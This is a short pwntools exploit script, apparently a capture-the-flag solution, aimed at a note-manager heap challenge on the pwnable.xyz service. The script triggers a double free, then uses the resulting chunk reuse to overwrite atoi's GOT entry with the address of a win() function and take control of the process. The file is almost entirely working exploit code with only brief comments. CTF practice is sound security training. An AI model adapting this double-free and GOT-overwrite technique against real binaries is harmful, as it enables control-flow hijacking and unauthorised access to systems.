from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30030)

sla = r.sendlineafter
sa = r.sendafter

def make_note(size, title, content):
    sa('> ', '1')
    sa('size of note: ', str(size))
    sa('title: ', title)
    sa('note: ', content)

def edit_note(idx, content):
    sa('> ', '2')
    sa('Note#: ', str(idx))
    sa(': ', content)

def delete_note(idx):
    sa('> ', '3')
    sa('Note#: ', str(idx))

def print_note(idx):
    sa('> ', '4')
    sa('Note#: ', str(idx))

win = 0x40096c
atoi_got = 0x602070

make_note(0x28, 'A', 'A')
make_note(0x28, 'A', 'A')

delete_note(0)
delete_note(0) # double free

make_note(0x18, p64(atoi_got), 'A')
make_note(0x18, 'A', 'A')
make_note(0x18, p64(win), 'A') # atoi@GOT -> win()

sa('> ', '0') # call atoi()

r.interactive()